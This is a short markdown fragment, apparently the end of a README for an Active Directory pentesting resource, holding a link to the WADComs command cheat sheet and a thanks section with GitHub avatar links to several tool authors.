- [Windows Active Directory Exploits WADComs](https://wadcoms.github.io/)

# Special Thanks to the Creator of tools and Community
[![](https://github.com/samratashok.png?size=50)](https://github.com/samratashok)
[![](https://github.com/saisathvik1.png?size=50)](https://github.com/saisathvik1)
[![](https://github.com/Pennyw0rth.png?size=50)](https://github.com/Pennyw0rth)
[![](https://github.com/fortra.png?size=50)](https://github.com/fortra)
[![](https://github.com/nicocha30.png?size=50)](https://github.com/nicocha30)
[![](https://github.com/XenSpawn.png?size=50)](https://github.com/X0RW3LL/XenSpawn)



---
